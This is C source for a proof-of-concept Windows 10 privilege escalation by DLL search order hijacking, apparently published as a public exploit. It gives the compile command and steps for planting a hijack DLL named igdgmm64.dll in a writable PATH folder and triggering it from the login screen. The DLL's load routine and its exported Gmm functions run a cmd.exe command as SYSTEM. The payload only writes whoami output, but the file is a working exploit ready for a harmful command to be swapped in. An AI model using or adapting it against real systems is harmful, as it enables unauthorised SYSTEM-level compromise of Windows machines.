#include <windows.h> 
#include <Winuser.h> 
// @404death Windows 10 Privilege Escalation Via dll Search Order Hijacking
// i686-w64-mingw32-gcc -shared -o igdgmm64.dll igdgmm64.c -lcomctl32 -Wl,--subsystem,windows
// C:\\windows\\system32\\cmd.exe /c whoami > C:\\windows\\temp\\0day.txt
/*
1. copy payload dll as igdgmm64.dll to SYSTEM path %PATH% which is writeable such as C:\python27
2. Press WinKey+L  
3. Press Enter
4. Press WinKey++(plusKey) on login screen.
then payload dll will execute as SYSTEM access.
*/



int GmmDestroy(){
    WinExec("C:\\windows\\system32\\cmd.exe /c whoami > C:\\0day.txt", 0);
    ExitProcess(0);
    return 0;
}
int GmmInit(){
    WinExec("C:\\windows\\system32\\cmd.exe /c whoami > C:\\0day.txt", 0);
    ExitProcess(0);
    return 0;
}
int OpenGmm(){
    WinExec("C:\\windows\\system32\\cmd.exe /c whoami > C:\\0day.txt", 0);
    ExitProcess(0);
    return 0;
}

BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)  
{  
  if (fdwReason == DLL_PROCESS_ATTACH)  
  {  
    GmmDestroy(); 
    GmmInit();
    OpenGmm(); 
  }  
  
  return TRUE;  
}  
